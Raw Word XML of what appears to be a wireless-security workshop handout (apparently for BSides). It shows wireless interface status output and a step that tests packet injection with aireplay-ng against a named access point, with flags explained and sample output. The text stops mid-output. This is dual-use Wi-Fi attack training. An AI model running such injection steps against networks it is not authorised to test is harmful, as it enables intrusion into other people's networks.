      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>dBm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   Sensitivity=0/3  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32E14188" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="00302511"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302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Retry:off</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   RTS </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>thr:off</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   Fragment </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>thr:off</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="069BC644" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="00302511"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302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        Encryption </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>key:off</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="2111D999" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="00302511"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302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        Power </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Management:off</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="44D59394" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="00302511"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302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        Link Quality=0/</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>94  Signal</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> level=-95 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>dBm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  Noise level=-95 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>dBm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="508B7C2A" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="00302511"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302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        Rx invalid </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">nwid:0  </w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Rx invalid </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">crypt:0  </w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Rx invalid frag:0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12274A93" w14:textId="77777777" w:rsidR="002B7D39"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302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Tx</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> excessive </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">retries:0  </w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Invalid </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">misc:0   </w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00302511">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Missed beacon:0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73854185" w14:textId="77777777" w:rsidR="00302511" w:rsidRDefault="00302511" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="54423E07" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="00EC3B33" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EC3B33">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Step 2 - Test Wireless Device Packet Injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C527C92" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="00EC3B33" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EC3B33">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>The purpose of this step ensures that your card is within distance of your AP and can inject packets to it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D8E11F2" w14:textId="77777777" w:rsidR="00302511" w:rsidRPr="006B3EAA" w:rsidRDefault="00302511" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:strike/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5381A157" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="006B3EAA" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:strike/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006B3EAA">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:strike/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Enter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7412E79A" w14:textId="77777777" w:rsidR="00302511" w:rsidRPr="006B3EAA" w:rsidRDefault="00302511" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:strike/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2F175834" w14:textId="3B12574E" w:rsidR="002B7D39" w:rsidRPr="0012143E" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aireplay</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -9 -e </w:t>
      </w:r>
      <w:r w:rsidR="007E5CF0" w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>BSIDES</w:t>
      </w:r>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -a 00:14:6C:7E:40:80  </w:t>
      </w:r>
      <w:r w:rsidR="00E45DB9" w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="144BFE7A" w14:textId="77777777" w:rsidR="00302511" w:rsidRPr="0012143E" w:rsidRDefault="00302511" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D9F9550" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="0012143E" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Where:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E2FF068" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="0012143E" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>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sidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-9 means injection test</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7026B785" w14:textId="6AF8AE14" w:rsidR="002B7D39" w:rsidRPr="0012143E" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>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sidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="007E5CF0" w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>BSIDES</w:t>
      </w:r>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> is the wireless network name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="185B5F2E" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="0012143E" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>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sidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 is the access point MAC address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="045F36EA" w14:textId="25DED553" w:rsidR="002B7D39" w:rsidRPr="0012143E" w:rsidRDefault="00E45DB9" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>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proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>wlan0mon</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="002B7D39" w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> is the wireless interface name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50C2C514" w14:textId="77777777" w:rsidR="002E6DDC" w:rsidRPr="0012143E" w:rsidRDefault="002E6DDC" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53CA6242" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="0012143E" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>The system should respond with:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1628611C" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="0012143E"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12143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>09:23:35  Waiting</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> for beacon frame (BSSID: 00:14:6C:7E:40:80) on channel 9</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26222E90" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="0012143E"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12143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>09:23:35  Trying</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> broadcast probe requests...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0861176B" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="0012143E"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12143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
